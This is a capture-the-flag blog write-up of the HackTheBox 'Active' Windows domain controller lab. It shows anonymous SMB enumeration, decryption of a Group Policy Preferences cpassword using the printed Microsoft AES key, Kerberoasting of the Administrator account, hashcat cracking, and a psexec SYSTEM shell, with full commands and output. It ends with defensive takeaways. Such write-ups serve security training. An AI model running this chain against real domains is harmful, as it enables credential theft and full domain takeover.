---
title: "HTB: Active Writeup"
summary: "An Easy difficulty Windows Active Directory machine involving Group Policy Preferences password disclosure, Kerberoasting, and Domain Administrator compromise."
categories: ["HackTheBox","Blog"]
tags: ["HackTheBox","Windows","ActiveDirectory","SMB","Kerberoasting","Impacket","Hashcat","PsExec"]
#externalUrl: ""
#showSummary: true
date: 2026-05-31
draft: false
---

# HTB: Active Writeup

---

## Machine Overview

- **Name:** Active
- **OS:** Windows Server 2008 R2
- **Difficulty:** Easy

Active is an Easy difficulty Windows Active Directory machine featuring an exposed SMB replication share accessible through anonymous authentication. Enumeration of Group Policy files reveals a `Groups.xml` file containing a Group Policy Preferences `cpassword` value for the `svc_tgs` service account. Because Microsoft publicly disclosed the encryption key used by GPP, the password can be decrypted and reused to gain authenticated domain access. With valid credentials, Kerberos service tickets are requested from accounts with registered Service Principal Names, yielding a crackable TGS hash for the `Administrator` account. After recovering the administrator password through offline cracking, PsExec is used to obtain a shell on the domain controller, resulting in full Domain Administrator access.

---

## Recon
### Portscanning
I used Nmap with default scripts (`-sC`) and version detection (`-sV`) to determine what is running on the target.
```sh
❯ sudo nmap -sC -sV 10.129.7.42 -o nmap -Pn  
[sudo] password for kevin:    
Sorry, try again.  
[sudo] password for kevin:    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-31 13:02 +0300  
Nmap scan report for DC.active.htb (10.129.7.42)  
Host is up (0.30s latency).  
Not shown: 983 closed tcp ports (reset)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)  
| dns-nsid:    
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-31 10:08:45Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped  
49152/tcp open  msrpc         Microsoft Windows RPC  
49153/tcp open  msrpc         Microsoft Windows RPC  
49154/tcp open  msrpc         Microsoft Windows RPC  
49155/tcp open  msrpc         Microsoft Windows RPC  
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
49158/tcp open  msrpc         Microsoft Windows RPC  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:    
|   2.1:    
|_    Message signing enabled and required  
|_clock-skew: 15s  
| smb2-time:    
|   date: 2026-05-31T10:09:48  
|_  start_date: 2026-05-31T06:24:36
```

Several ports immediately suggest that this machine is a **Domain Controller**:

|Port|Service|Why It Matters|
|---|---|---|
|53|DNS|Active Directory relies heavily on DNS|
|88|Kerberos|AD authentication service|
|389|LDAP|Directory service used by AD|
|445|SMB|File sharing and enumeration|
|3268|Global Catalog|Another AD-specific service|

The LDAP banner reveals the domain name `active.htb`
Sine we have smb, we can also generate hosts file 
```sh
❯ nxc smb active.htb --generate-hosts-file host  
SMB         10.129.7.42     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
❯ cat host  
10.129.7.42     DC.active.htb active.htb DC
```

## smb enumeration
Because SMB is often misconfigured,I checked for anonymous and guest login and anonymous login succeeded, then proceeded to list shares
```sh
❯ nxc smb active.htb -u '' -p ''  
SMB         10.129.7.42     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.7.42     445    DC               [+] active.htb\:    
❯ nxc smb active.htb -u guest -p ''  
SMB         10.129.7.42     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.7.42     445    DC               [-] active.htb\guest: STATUS_ACCOUNT_DISABLED
	❯ nxc smb active.htb -u '' -p '' --shares  
SMB         10.129.7.42     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.7.42     445    DC               [+] active.htb\:    
SMB         10.129.7.42     445    DC               [*] Enumerated shares  
SMB         10.129.7.42     445    DC               Share           Permissions     Remark  
SMB         10.129.7.42     445    DC               -----           -----------     ------  
SMB         10.129.7.42     445    DC               ADMIN$                          Remote Admin  
SMB         10.129.7.42     445    DC               C$                              Default share  
SMB         10.129.7.42     445    DC               IPC$                            Remote IPC  
SMB         10.129.7.42     445    DC               NETLOGON                        Logon server share    
SMB         10.129.7.42     445    DC               Replication     READ               
SMB         10.129.7.42     445    DC               SYSVOL                          Logon server share    
SMB         10.129.7.42     445    DC               Users
```
The important one is `Replication` because domain replication often contains Group Policy Objects (GPOs). We do not have read permissions in `Users` share
Let's inspect it.
 ```sh
❯ smbclient //active.htb/Replication -U '' --no-pass  
  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Sat Jul 21 13:37:44 2018  
 ..                                  D        0  Sat Jul 21 13:37:44 2018  
 active.htb                          D        0  Sat Jul 21 13:37:44 2018  
  
               5217023 blocks of size 4096. 278916 blocks available   
smb: \> cd active.htb  
smb: \active.htb\> ls  
 .                                   D        0  Sat Jul 21 13:37:44 2018  
 ..                                  D        0  Sat Jul 21 13:37:44 2018  
 DfsrPrivate                       DHS        0  Sat Jul 21 13:37:44 2018  
 Policies                            D        0  Sat Jul 21 13:37:44 2018  
 scripts                             D        0  Wed Jul 18 21:48:57 2018  
  
               5217023 blocks of size 4096. 278916 blocks available  
smb: \active.htb\> ls DfsrPrivate  
 DfsrPrivate                       DHS        0  Sat Jul 21 13:37:44 2018  
  
               5217023 blocks of size 4096. 278916 blocks available  
smb: \active.htb\> ls Policies  
 Policies                            D        0  Sat Jul 21 13:37:44 2018  
  
               5217023 blocks of size 4096. 278916 blocks available  
smb: \active.htb\> ls scripts  
 scripts                             D        0  Wed Jul 18 21:48:57 2018  
  
               5217023 blocks of size 4096. 278916 blocks available  
smb: \active.htb\> cd scripts  
smb: \active.htb\scripts\> ls  
 .                                   D        0  Wed Jul 18 21:48:57 2018  
 ..                                  D        0  Wed Jul 18 21:48:57 2018  
  
               5217023 blocks of size 4096. 278660 blocks availablesmb: \active.htb\> cd Policies  
smb: \active.htb\Policies\> ls  
 .                                   D        0  Sat Jul 21 13:37:44 2018  
 ..                                  D        0  Sat Jul 21 13:37:44 2018  
 {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 13:37:44 2018  
 {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 13:37:44 2018  
  
               5217023 blocks of size 4096. 278660 blocks available
smb: \active.htb\Policies\> recurse ON  
smb: \active.htb\Policies\> prompt OFF  
smb: \active.htb\Policies\> mget *  
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as {31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)  
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as {6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)  
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as {31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)  
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as {31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (2.1 KiloBytes/sec) (average 0.6 KiloBytes/sec)  
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as {31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.4 KiloBytes/sec) (average 0.5 K  
iloBytes/sec)  
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as {31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (0.8 KiloBy  
tes/sec) (average 0.6 KiloBytes/sec)  
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as {6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.9 KiloBy  
tes/sec) (average 0.9 KiloBytes/sec)  
smb: \active.htb\Policies\>
 ```

I then downloaded everything in the `Policies` share
```sh
❯ tree  
.  
├── {31B2F340-016D-11D2-945F-00C04FB984F9}  
│   ├── GPT.INI  
│   ├── Group Policy  
│   │   └── GPE.INI  
│   ├── MACHINE  
│   │   ├── Microsoft  
│   │   │   └── Windows NT  
│   │   │       └── SecEdit  
│   │   │           └── GptTmpl.inf  
│   │   ├── Preferences  
│   │   │   └── Groups  
│   │   │       └── Groups.xml  
│   │   └── Registry.pol  
│   └── USER  
├── {6AC1786C-016F-11D2-945F-00C04fB984F9}  
│   ├── GPT.INI  
│   ├── MACHINE  
│   │   └── Microsoft  
│   │       └── Windows NT  
│   │           └── SecEdit  
│   │               └── GptTmpl.inf  
│   └── USER
```
Examining the downloaded content `Groups.xml` immediately caught my attention.
Historically, administrators used **Group Policy Preferences (GPP)** to deploy local accounts and passwords across machines.

The problem? Microsoft stored passwords in a reversible format inside XML files.
Let's inspect it.

## Initial foothold
the groups xml contained  a user  `SVC_TGS`and its Cpassword
```xml  
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
	<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
		<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
	</User>
</Groups>
```
The `cpassword` value is encrypted using AES, but Microsoft published the encryption key years ago. As a result, any attacker who can read the XML file can decrypt the password.

## Decrypting cpassword
I then used python to decrypt the password using the known Microsoft GPP AES key
```python
from base64 import b64decode
from Crypto.Cipher import AES

key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'

cpassword = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```
Running it we get thepassword for `svc_tgs`
```sh
❯ python3 gppdecrypt.py  
GPPstillStandingStrong2k18
❯ nxc smb active.htb -u svc_tgs -p 'GPPstillStandingStrong2k18'  
SMB         10.129.7.42     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.7.42     445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18
```

Now that we have a password for a tgs service account we can try kerberoasting

## Kerberoasting
Service accounts often have Service Principal Names (SPNs) registered.
If an SPN exists, Kerberos allows us to request a service ticket and attempt to crack it offline.
Since we already have valid credentials for `svc_tgs`, we can query Active Directory for SPNs using `bloodyAD`

```sh
bloodyAD --host dc.active.htb -d active.htb -u svc_tgs -p 'GPPstillStandingStrong2k18' get search --filter '(servicePrincipalName=*)' --attr sAMAccountName servicePrincipalName
```

```sh
❯ GetUserSPNs.py active.htb/svc_tgs:'GPPstillStandingStrong2k18' -request -dc-ip 10.129.7.42  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation    
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------  
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 22:06:40.351723  2026-05-31 09:25:36.755748                
  
  
  
[-] CCache file is not found. Skipping...  
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$2d3a8c593319a4bbdeaacb9e559cba4a$62eb45c70ae4f75132c94bf0d31bb2488a32c22700cc6167da1772ce83674485c1e0f3f5786785b204bb5b0d067906835d47024fd0e84d3d9553d62e030777eea4a58d2219e6  
d71985ab2175bfc882581553d109889cc5cbca551dda4114aea77921a639c53c24d811deb7e28ccde7ce40b0038aca2704416ba8f2ac40c10f07ad8509bab34cb2e083aca771aa62ac69ccf43b1583c32fbba2250be2f5516107c81a3e94cac8a1b93bc9b48276c082ed41d79a3d8797a680bb91cce26  
afa4a47ee13af3053032dbfeca7faaef6f4e92f60fe7890d91345ae8370e90c36bbb19fdefdb43d426230d5dad1f22796779759d04848a2bcadd46e7d7cb338e381973260cbe45d9a49864f2cd0b2fcea4d58ce5ce34a84586805492009b70668b1894766d81e7b9e77b4106d1e358487271114fcdde0  
66adedce75cd080cadfb00854cac3d2787c18f81a7d570de4c455fedbb4d855fab7825d8191cf09e11c6f8b9c2874ab0b3d93699cf2db45ae0d168c14997493af7a50ece54095964cadd3ac3beca1b6429733fed3e2e03ed9dd0a2949e835790b5818c54de75b26caa85522fc7e598c0960b899970e9a  
de51dee9cb55473d542a2bb8ecdcb6a3ac4b0c2d192200210cb0e9d1c1c9c5ccfc8b81d1ef1a50d0286827ecea4e3e887b0744c4231f7e9487a8e135e5ab016fd0a59df45fcbfa49025cf77b50231433ca49125b03b30afb62090a8572da139d5d28e9364993c6b68be029e01cda1fe5aaadde0103571  
606e997fce2e3c2b20748f5802f2849e7e6c4477eb55966b93095fa6d908318e42f53128440686c6678459438977680e06bb9d730a36c8c80e836023919b65b60bfe490a2755be12b01af5a5138218a6239c57a170aba2bc01404384abfeb4504d0cd1d1cd3a61b5e1b90cf07547ec3c493a06405e1c6  
d7b553fc7cb077ce53a9205e12ed52db8d503109343d9619af2d8666765015cfe5f8e07744e74ef2f23bba2efe9de9ee105b8ecee49250ab82b6bf042723e8872c876f4390a4f3425a7d4940c23b41aca8c19b8723fc6395c1e915f2384036fc562ce8fb6efcd972b983c6dc940eb18199b148f98fae7  
0a75c4e1b77049819c3058e789cf243cf4db28c63d07bc96174e721db719bebb5edc5c15823725ee30da989dc9bc3377a5bbe21436414475f7d92411ab847e89d7227bddc1c944b45a6dc31b947d6149de5e7476110ecd3fb231b59235561a390109dd81ec73dc738d96fba60d
```

From the output,`Administrator` is kerberoastable and kerberoasting gave a hash which we can crack offline

## Cracking the Kerberos Ticket

```sh
❯ nano admin.hash  
❯ hashcat admin.hash ~/Documents/cybersec/wordlists/rockyou.txt  
hashcat (v7.1.2) starting in autodetect mode  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 PRO 5650U with Radeon Graphics, 13649/27299 MB (13649 MB allocatable), 12MCU  
  
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.  
The following mode was auto-detected as the only one matching your input hash:  
  
13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol  
  
NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!  
Do NOT report auto-detect issues unless you are certain of the hash type.  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 515 MB (13295 MB free)  
  
Dictionary cache hit:  
* Filename..: /home/kevin/Documents/cybersec/wordlists/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
  
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$2d3a8c593319a4bbdeaacb9e559cba4a$62eb45c70ae4f75132c94bf0d31bb2488a32c22700cc6167da1772ce83674485c1e0f3f5786785b204bb5b0d067906835d47024fd0e84d3d9553d62e030777eea4a58d2219e6  
d71985ab2175bfc882581553d109889cc5cbca551dda4114aea77921a639c53c24d811deb7e28ccde7ce40b0038aca2704416ba8f2ac40c10f07ad8509bab34cb2e083aca771aa62ac69ccf43b1583c32fbba2250be2f5516107c81a3e94cac8a1b93bc9b48276c082ed41d79a3d8797a680bb91cce26  
afa4a47ee13af3053032dbfeca7faaef6f4e92f60fe7890d91345ae8370e90c36bbb19fdefdb43d426230d5dad1f22796779759d04848a2bcadd46e7d7cb338e381973260cbe45d9a49864f2cd0b2fcea4d58ce5ce34a84586805492009b70668b1894766d81e7b9e77b4106d1e358487271114fcdde0  
66adedce75cd080cadfb00854cac3d2787c18f81a7d570de4c455fedbb4d855fab7825d8191cf09e11c6f8b9c2874ab0b3d93699cf2db45ae0d168c14997493af7a50ece54095964cadd3ac3beca1b6429733fed3e2e03ed9dd0a2949e835790b5818c54de75b26caa85522fc7e598c0960b899970e9a  
de51dee9cb55473d542a2bb8ecdcb6a3ac4b0c2d192200210cb0e9d1c1c9c5ccfc8b81d1ef1a50d0286827ecea4e3e887b0744c4231f7e9487a8e135e5ab016fd0a59df45fcbfa49025cf77b50231433ca49125b03b30afb62090a8572da139d5d28e9364993c6b68be029e01cda1fe5aaadde0103571  
606e997fce2e3c2b20748f5802f2849e7e6c4477eb55966b93095fa6d908318e42f53128440686c6678459438977680e06bb9d730a36c8c80e836023919b65b60bfe490a2755be12b01af5a5138218a6239c57a170aba2bc01404384abfeb4504d0cd1d1cd3a61b5e1b90cf07547ec3c493a06405e1c6  
d7b553fc7cb077ce53a9205e12ed52db8d503109343d9619af2d8666765015cfe5f8e07744e74ef2f23bba2efe9de9ee105b8ecee49250ab82b6bf042723e8872c876f4390a4f3425a7d4940c23b41aca8c19b8723fc6395c1e915f2384036fc562ce8fb6efcd972b983c6dc940eb18199b148f98fae7  
0a75c4e1b77049819c3058e789cf243cf4db28c63d07bc96174e721db719bebb5edc5c15823725ee30da989dc9bc3377a5bbe21436414475f7d92411ab847e89d7227bddc1c944b45a6dc31b947d6149de5e7476110ecd3fb231b59235561a390109dd81ec73dc738d96fba60d:Ticketmaster1968  
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)  
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...fba60d  
Time.Started.....: Sun May 31 12:59:53 2026 (5 secs)  
Time.Estimated...: Sun May 31 12:59:58 2026 (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/home/kevin/Documents/cybersec/wordlists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:  2087.6 kH/s (4.28ms) @ Accel:1024 Loops:1 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 10543104/14344384 (73.50%)  
Rejected.........: 0/10543104 (0.00%)  
Restore.Point....: 10530816/14344384 (73.41%)  
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#01...: Tr1n1t7303 -> Teague  
Hardware.Mon.#01.: Temp: 82c Util: 75%  
  
Started: Sun May 31 12:59:49 2026  
Stopped: Sun May 31 13:00:00 2026
```

password cracked for administrator which is `Ticketmaster1968`
At this point we have full Domain Administrator access.

## Gaining Administrative Access
I used psexec to get shell access to the DC as `nt authority\system`
```powershell
❯ psexec.py active.htb/Administrator:Ticketmaster1968@10.129.7.42  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Requesting shares on 10.129.7.42.....  
[*] Found writable share ADMIN$  
[*] Uploading file IcNiaIUc.exe  
[*] Opening SVCManager on 10.129.7.42.....  
[*] Creating service wEhk on 10.129.7.42.....  
[*] Starting service wEhk.....  
[!] Press help for extra shell commands  
Microsoft Windows [Version 6.1.7601]  
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.  
  
C:\Windows\system32> whoami  
nt authority\system  
  
C:\Windows\system32>
```

## Retrieving the User Flag
User flag is found inthe svc_tgs desktop folder
```powershell
C:\Users\Administrator\Desktop> cd C:\Windows\system32  
   
C:\Windows\System32> cd C:\Users\SVC_TGS\Desktop  
   
  
C:\Users\SVC_TGS\Desktop>type user.txt  
9b4840***032fab2f  
C:\Users\SVC_TGS\Desktop>
```
## Retrieving the Root Flag
The root flag is found in Administrators desktop folder which we can read to get the flag
```powershell
C:\Windows\system32> cd C:\Users\Administrator\Desktop  
   
C:\Users\Administrator\Desktop> type root.txt  
7c229***dbadb  
  
C:\Users\Administrator\Desktop>
```

## Attack Chain Summary

```
Null SMB session
       ↓
Read Replication share (SYSVOL mirror)
       ↓
Found Groups.xml → cpassword for SVC_TGS
       ↓
Decrypted with MS-published AES key → GPPstillStandingStrong2k18
       ↓
Authenticated as SVC_TGS
       ↓
Kerberoasted Administrator SPN (active/CIFS:445)
       ↓
Cracked TGS ticket → Ticketmaster1968
       ↓
psexec as Administrator → SYSTEM shell
```

## Key Takeaways

- **Null sessions** on SMB should be disabled in production — they expose the share listing without any credentials.
- **GPP passwords (MS14-025)** have been patched since 2014, but old GPO files with `cpassword` attributes can still linger on unpatched or migrated domains.
- **Kerberoasting** is nearly undetectable because requesting a TGS is a normal Kerberos operation. The defence is to use strong, random passwords (30+ characters) on service accounts, or switch to **Group Managed Service Accounts (gMSA)** which rotate automatically.
- **High-privilege accounts like Administrator should never have SPNs.** This gave us a direct path to full domain compromise.